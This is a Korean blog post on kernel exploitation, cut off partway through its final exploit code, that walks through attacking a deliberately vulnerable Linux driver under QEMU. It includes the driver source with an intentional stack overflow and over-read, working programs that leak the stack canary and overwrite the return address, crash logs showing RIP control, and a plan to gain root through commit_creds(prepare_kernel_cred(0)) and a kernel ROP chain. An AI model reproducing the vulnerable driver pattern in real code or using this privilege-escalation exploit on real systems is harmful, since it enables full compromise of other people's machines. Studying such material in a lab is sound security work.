

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="G4EG4EGAE">
  <meta name="keywords" content="">
  
  <title>[Research] Linux Kernel Exploit - Bypassing SSP - Hexo</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>G4EG4EG4E's TECHNOTE</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="[Research] Linux Kernel Exploit - Bypassing SSP">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-10-03 07:01" pubdate>
        October 3, 2021 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.3k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      45
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">[Research] Linux Kernel Exploit - Bypassing SSP</h1>
            
            <div class="markdown-body">
              <h2 id="Research-Linux-Kernel-Exploit-Bypassing-SMAP"><a href="#Research-Linux-Kernel-Exploit-Bypassing-SMAP" class="headerlink" title="[Research] Linux Kernel Exploit - Bypassing SMAP"></a>[Research] Linux Kernel Exploit - Bypassing SMAP</h2><p><img src="/img/penguinshot.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>해당 포스트에서는 Linux Kernel Basic 시리즈의 정보를 기반으로 하여 리눅스 커널에 적용되어 있는 보호기법(mitigation)을 하나씩 우회하여 공격하는 과정을 포스트하려고 한다. 해당 포스트에서는 SSP 보호기법을 주제로 하여 해당 보호기법이 어떠한 보호기법인지 이해하고 이를 우회하여 공격하는 방법을 작성하려고 한다.</p>
</br>
</br>

<h2 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h2></br>

<p><img src="/img/canary.jpg" srcset="/img/loading.gif" lazyload></p>
</br>

<p><b>SSP(Stack Smashing Protector)</b>은 Stack에서의 지정된 버퍼 크기 이상의 데이터가 입력되어 실행흐름이 변조될 경우 버퍼와 Return Address 사이의 임의의 난수값을 설정해두어 함수가 종료된 후 해당 함수를 호출한 영역(Caller)으로 돌아가기 이전에 이를 확인하는 보호기법을 의미한다.</p>
</br>

<p>나에게 있어서는 스택 카나리라는 이름으로 더욱 익숙하다. 사실 해당 기법이 아이디어는 하나인데 별명(Stack Canary, Stack Cookie, Stack Guard…)은 운영체제에 따라서도 다르게 불리어지고 하니까 이름이 중요한 것 보다 아이디어에 집중하는 것이 좋을 것으로 판단된다. 이러한 인사이트를 나만의 경험으로 제시하기 위해서 재밌는(?) 부가설명을 덧붙히겠다.</p>
</br>

<p>상단에 제시된 그림의 경우는 버드박스(2018)라는 영화이다. 사람이 눈으로 확인할 수 없는 괴물이 나오는 영화인데 새를 데리고 다니면 새는 이러한 괴물을 감지하는 역할을 한다. 광산에서도 유독가스가 발생하면 예전에는 카나리아를 이용해서 위험성을 감지하고 대피하였다고 한다. 그래서 소프트웨어 입장에서는 공격상황에 대한 감지로 스택에 있는 카나리아라고 불린다고 이름을 들었던 것 같다. 제일 흥미로운 이름으로 지정되었으니까 앞으로는 스택 카나리라고 부르겠다.</p>
</br>

<p>실제 구현원리는 매우 직관적이며 간단하다. 버퍼와 Return Address 사이의 임의의 난수값을 설정해두어 이를 확인하는 원리이다. 그렇다면 스택 기반에서 오버 플로우를 발생시키기 이전 <u>스택 카나리의 값을 공격자가 알 수 있는 환경</u>이라고 하면 이를 고려하여 오버 플로우를 발생시키면 되는 것이다.</p>
<p></br></br></p>
<h2 id="환경분석"><a href="#환경분석" class="headerlink" title="환경분석"></a>환경분석</h2><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><pre><code>qemu-system-x86_64 \
-m 512M \
-kernel ./bzImage \
-initrd  ./rootfs.cpio \
-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
-cpu qemu64,smep,smap \
</code></pre>
<p>부팅 스크립트의 경우 다음과 같은 형태로 작성되어 있다. 적용된 보호기법을 확인해보면 KASLR의 경우는 비활성화 해두었으며 SMEP과 SMAP의 경우는 활성화 되어 있다. </p>
<p>환경분석에서는 기재할 수 없지만 디바이스 드라이버를 컴파일 할 경우 기본적으로 SSP가 활성화되어 컴파일되므로 모든 함수 에필로그에서 Stack Canary가 오염되었는 지 확인하는 로직이 자동적으로 추가된다.</p>
<p></br></br></p>
<h2 id="바이너리-분석"><a href="#바이너리-분석" class="headerlink" title="바이너리 분석"></a>바이너리 분석</h2><h3 id="디바이스-드라이버-소스코드"><a href="#디바이스-드라이버-소스코드" class="headerlink" title="디바이스 드라이버 소스코드"></a>디바이스 드라이버 소스코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;linux/input.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>#include &lt;linux/miscdevice.h&gt;<br>#include &lt;linux/device.h&gt;<br>#include &lt;linux/slab.h&gt;<br>#include &lt;linux/uaccess.h&gt;<br>#include &lt;linux/string.h&gt;<br><br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br>MODULE_AUTHOR(&quot;SAMPLE&quot;);<br><br>static ssize_t test_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos);<br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos);<br><br>struct file_operations test_fops = &#123;<br>    .read   = test_read,<br>    .write  = test_write,<br>&#125;;<br><br>static struct miscdevice test_driver = &#123;<br>    .minor = MISC_DYNAMIC_MINOR,<br>    .name = &quot;test&quot;,<br>    .fops = &amp;test_fops,<br>&#125;;<br><br>static ssize_t test_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kzalloc(count, GFP_KERNEL);<br>    memcpy(ptr, arr, count);<br><br>    copy_to_user(buf, ptr, count);<br><br>    return 0;<br>&#125;<br><br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kmalloc(count, GFP_KERNEL);<br><br>    copy_from_user(ptr, buf, count);<br>    memcpy(arr, ptr, count);<br>    <br>    printk(&quot;arr : %x&quot;, arr[count-1]); <br><br>    return 0;<br>&#125;<br><br><br>static int test_init(void) &#123;<br>    int result;<br><br>    result = misc_register(&amp;test_driver);<br><br>    return 0;<br>&#125;<br><br>static void test_exit(void) &#123;<br>    misc_deregister(&amp;test_driver);<br>&#125;<br><br>module_init(test_init);<br>module_exit(test_exit);<br></code></pre></td></tr></table></figure>

<p>해당 소스코드의 경우 공격 벡터(attack vector)가 될 수 있는 디바이스 드라이버 파일의 소스코드이다. 소스코드를 확인해볼 경우 file_operations 구조체 내부에서 read, write 시스템 콜에 대응하는 동작들을 정의하고 있다.</p>
<p>디바이스 드라이버 파일을 토대로 read 시스템 콜을 호출하게 될 경우 test_read() 함수가 실행된다. 해당 함수가 실행될 경우 line33에 의하여 커널에서 메모리를 동적할당한 후 커널의 스택 버퍼에 있는 데이터를 복사해오는 것을 확인할 수 있다. 해당 로직에서 값을 복사하는 count가 공격자가 임의로 변경할 수 있기 때문에 커널 스택 버퍼에 있는 값들을 leak할 수 있다. 해당 시스템 호출을 통해서 stack canary를 알 수 있다. </p>
<p>디바이스 드라이버 파일을 토대로 write 시스템 콜을 호출하게 될 경우 test_wrtie() 함수가 실행된다. 해당 함수가 실행될 경우 line48에 의하여 유저영역의 메모리를 커널의 스택버퍼에 복사하기에 이를 통한 메모리 오염(memory corruption)이 가능하다. 결과적으로 return address를 조작할 수 있음으로 실행 흐름의 변조가 가능할 것으로 보여진다.</p>
<p></br></br></p>
<h2 id="취약점-분석"><a href="#취약점-분석" class="headerlink" title="취약점 분석"></a>취약점 분석</h2><p><b>바이너리 분석</b>에서 사용자의 입력으로 부터 커널 스택의 정보를 알 수 있으며 실행흐름을 변조할 가능성이 있음을 확인하였다. 해당 디바이스 드라이버를 토대로 write 시스템 콜이 호출되게 될 경우 디바이스 드라이버의 경우 사용자의 입력(untrusted input)이 버퍼 오버플로우를 발생시키기 때문이다. 예상한 결과가 맞는가에 대해서 확인해볼 필요가 있다.</p>
</br>

<h3 id="공격-코드-1"><a href="#공격-코드-1" class="headerlink" title="공격 코드(1)"></a>공격 코드(1)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>int main() &#123;<br>    int fd;<br>    size_t *canary[6] = &#123;0, &#125;;<br><br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    read(fd, canary, sizeof(canary));<br>    <br>    printf(&quot;canary[0] = %lx\n&quot;, canary[0]);<br>    printf(&quot;canary[1] = %lx\n&quot;, canary[1]);<br>    printf(&quot;canary[2] = %lx\n&quot;, canary[2]);<br>    printf(&quot;canary[3] = %lx\n&quot;, canary[3]);<br>    printf(&quot;canary[4] = %lx\n&quot;, canary[4]);<br>    printf(&quot;canary[5] = %lx\n&quot;, canary[5]);<br><br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>디바이스 드라이버를 제어하는 코드를 작성하였다. 디바이스에 해당하는 파일을 통해 read 시스템 콜을 호출함을 통해서 커널 스택의 정보를 유출(leak)해보려고 한다. 총 48바이트 크기의 데이터를 출력해봄으로 어떠한 부분이 카나리로 예상될 지 출력할 수 있다. 디바이스 드라이버의 test_read() 함수 내부의 버퍼의 크기는 8바이트이므로 충분한 크기의 정보를 출력한다는 것을 가정해서 진행해보겠다.</p>
</br>

<h3 id="공격-결과-1"><a href="#공격-결과-1" class="headerlink" title="공격 결과(1)"></a>공격 결과(1)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ ./leak 
canary[0] = 0
canary[1] = 7f78bbec01f33a00
canary[2] = 30
canary[3] = 1
canary[4] = ffffffff811e311b
canary[5] = ffff88801d9ec900
/ $ ./leak 
canary[0] = 0
canary[1] = 875b1e91019ab700
canary[2] = 30
canary[3] = 1
canary[4] = ffffffff811e311b
canary[5] = ffff88801d9eca00
/ $ ./leak 
canary[0] = 0
canary[1] = c24444f6245e5700
canary[2] = 30
canary[3] = 1
canary[4] = ffffffff811e311b
canary[5] = ffff88801d9ecb00
/ $ ./leak 
canary[0] = 0
canary[1] = 92fb1f83c3973e00
canary[2] = 30
canary[3] = 1
canary[4] = ffffffff811e311b
canary[5] = ffff88801d9ec900
/ $ ./leak 
canary[0] = 0
canary[1] = 2ed61794e0235300
canary[2] = 30
canary[3] = 1
canary[4] = ffffffff811e311b
canary[5] = ffff88801d9eca00
</code></pre>
<p>작성하였던 코드를 토대로 커널 스택 버퍼에 있는 데이터를 유출(leak)해본 결과 다음과 같은 형태이다. 사실 디버깅을 진행하면 어떠한 위치가 스택 카나리에 해당하는 값인지 명확히 알 수 있지만 현재의 결과를 보았을 때 커널 버퍼의 사이즈는 8이며 이후의 값부터 가장 규칙성을 띄지 않는 스택 카나리라고 판단되는 값은 canary[1]에 해당하는 값으로 판단된다. </p>
<p>또한 위에서는 제시하지 않았지만 이전 포스트에서 제시하였던 방법과 동일하게 return address를 확인해본 결과 버퍼에서 40바이트 떨어진 곳이 return address로 판단된다.</p>
</br>

<h3 id="공격-코드-2"><a href="#공격-코드-2" class="headerlink" title="공격 코드(2)"></a>공격 코드(2)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>int main() &#123;<br>    int fd;<br>    size_t *canary[6] = &#123;0, &#125;;<br>    size_t payload[20] = &#123;0, &#125;;<br><br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br><br>    // STEP1. Leak Stack Canary<br>    read(fd, canary, sizeof(canary));<br>    <br>    printf(&quot;canary[0] = %lx\n&quot;, canary[0]);<br>    printf(&quot;canary[1] = %lx\n&quot;, canary[1]);<br>    printf(&quot;canary[2] = %lx\n&quot;, canary[2]);<br>    printf(&quot;canary[3] = %lx\n&quot;, canary[3]);<br>    printf(&quot;canary[4] = %lx\n&quot;, canary[4]);<br>    printf(&quot;canary[5] = %lx\n&quot;, canary[5]);<br><br><br>    // STEP2. Corrupt Stack Memory<br>    payload[0] = canary[1];<br>    payload[1] = canary[1];<br>    payload[2] = canary[1];<br>    payload[3] = canary[1];<br>    payload[4] = canary[1];<br>    payload[5] = 0x4343434343434343;<br><br>    write(fd, payload, sizeof(payload));<br><br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="공격-결과-2"><a href="#공격-결과-2" class="headerlink" title="공격 결과(2)"></a>공격 결과(2)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ ./crash 
canary[0] = 0
canary[1] = 77aa91d07abac300
canary[2] = 30
canary[3] = 1
canary[4] = ffffffff811e311b
canary[5] = ffff88801d9ec300
[    3.942545] arr : 0
[    3.942953] general protection fault: 0000 [#1] SMP NOPTI
[    3.944977] CPU: 0 PID: 70 Comm: crash Tainted: G           O      5.8.5 #1
[    3.946180] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[    3.948119] RIP: 0010:0x4343434343434343
[    3.949110] Code: Bad RIP value.
[    3.955544] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000286
[    3.955840] RAX: 0000000000000000 RBX: 77aa91d07abac300 RCX: 0000000000000000
[    3.956295] RDX: 0000000000000000 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0
[    3.956783] RBP: 77aa91d07abac300 R08: 0000000030203a20 R09: 0000000000000007
[    3.957227] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 77aa91d07abac300
[    3.957691] R13: 00000000000000a0 R14: ffffc9000019ff10 R15: 00007ffdbbfb26a0
[    3.958258] FS:  000000000168b880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000
[    3.958848] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    3.960591] CR2: 000000000168db28 CR3: 000000001da40000 CR4: 00000000003006f0
[    3.961172] Call Trace:
[    3.962152]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
[    3.964479] Modules linked in: test(O)
[    3.965730] ---[ end trace e9e73822d90c8f9d ]---
[    3.967058] RIP: 0010:0x4343434343434343
[    3.967454] Code: Bad RIP value.
[    3.967779] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000286
[    3.968107] RAX: 0000000000000000 RBX: 77aa91d07abac300 RCX: 0000000000000000
[    3.968623] RDX: 0000000000000000 RSI: ffffffff82b2bba0 RDI: ffffffff82b2bfa0
[    3.969116] RBP: 77aa91d07abac300 R08: 0000000030203a20 R09: 0000000000000007
[    3.969657] R10: 0000000000000046 R11: ffffffff82b2bba7 R12: 77aa91d07abac300
[    3.970123] R13: 00000000000000a0 R14: ffffc9000019ff10 R15: 00007ffdbbfb26a0
[    3.970625] FS:  000000000168b880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000
[    3.971228] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    3.971760] CR2: 000000000168db28 CR3: 000000001da40000 CR4: 00000000003006f0
[    3.972372] Kernel panic - not syncing: Fatal exception
[    3.973145] Kernel Offset: disabled
[    3.973878] Rebooting in 1 seconds..
qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220
This usually means one of the following happened:

(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)
(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end
(3) Your guest kernel has a bug and crashed by jumping off into nowhere

This is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.
If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.

Execution cannot continue; stopping here.
</code></pre>
</br>

<p>작성한 공격코드를 토대로 공격을 수행해본 결과 의도하였던 바와 같이 실행흐름을 담당하는 레지스터 RIP가 변조된 것을 확인할 수 있었다. 만약 스택 카나리의 값이 일치하지 않았다면 다음과 같은 형태의 커널 패닉이 아닌 Stack Smashing Detected와 같은 다른 형태의 정보를 보여주었을 것이다. 그러므로 추출한 카나리의 값은 정상적인 형태의 카나리이며 SSP를 우회하여 실행흐름을 변조할 수 있다는 결론을 내렸다.</p>
<p></br></br></p>
<h2 id="취약점-공격"><a href="#취약점-공격" class="headerlink" title="취약점 공격"></a>취약점 공격</h2><p>분석과정을 통해 사용자의 입력(untrusted input)을 통해 실행흐름을 변조할 수 있음을 확인하였다. 이러한 정보들을 토대로 공격자에게 유의미한 형태의 공격이 될 수 있도록 어떠한 형태로 공격을 진행할 것인가에 대해서 시나리오를 작성하겠다.</p>
<p>가장 파급력있고 공격자에게 자유도가 높은 방법은 리눅스(linux) 기반의 커널을 공격하는 것이기에 루트 권한의 쉘(shell)을 획득하는 것으로 볼 수 있다. 다음과 같은 공격이 이루어지기 위해서는 우선적으로 진행되어야 하는 것이 유저 권한을 루트 권한으로 상승(권한 상승)을 일으켜야 한다. </p>
</br>

<h3 id="공격-시나리오"><a href="#공격-시나리오" class="headerlink" title="공격 시나리오"></a>공격 시나리오</h3><pre><code>STEP1. stack canary 유출(leak) 
STEP2. commit_creds(prepare_kernel_cred(0))을 통한 권한 상승
STEP3. 사용자 모드(user mode)로의 전환
STEP4. shell 획득
</code></pre>
<p>해당 시나리오의 경우 지금까지 작성해왔던 일반적인 익스플로잇과 유사하다. SMEP, SMAP이 적용되어 있으므로 시나리오에 해당하는 페이로드를 Kernel ROP를 기반으로 하여 진행하며 SSP가 적용되어 있으므로 stack canary의 값을 고려하여 공격을 수행하여야 한다. 그러므로 우선적으로 STEP1에 해당하는 leak을 먼저 수행하여 해당 값을 토대로 페이로드를 작성해야 한다.</p>
</br>


<h3 id="가젯-구성"><a href="#가젯-구성" class="headerlink" title="가젯 구성"></a>가젯 구성</h3><p>가젯 구성의 경우 <a target="_blank" rel="noopener" href="https://gaegaegae.github.io/2021/09/30/linux-kernel-exploit-bypassing-smep//#가젯-구성">Bypassing SMEP</a>에 작성한 형태와 동일하기에 해당 과정의 기재는 생략하도록 하겠다.</p>
</br>

<h3 id="가젯-추출"><a href="#가젯-추출" class="headerlink" title="가젯 추출"></a>가젯 추출</h3><p>가젯 추출의 경우 <a target="_blank" rel="noopener" href="https://gaegaegae.github.io/2021/09/30/linux-kernel-exploit-bypassing-smep//#가젯-추출">Bypassing SMEP</a>에 작성한 형태와 동일하기에 해당 과정의 기재는 생략하도록 하겠다.</p>
</br>

<h3 id="공격코드"><a href="#공격코드" class="headerlink" title="공격코드"></a>공격코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t 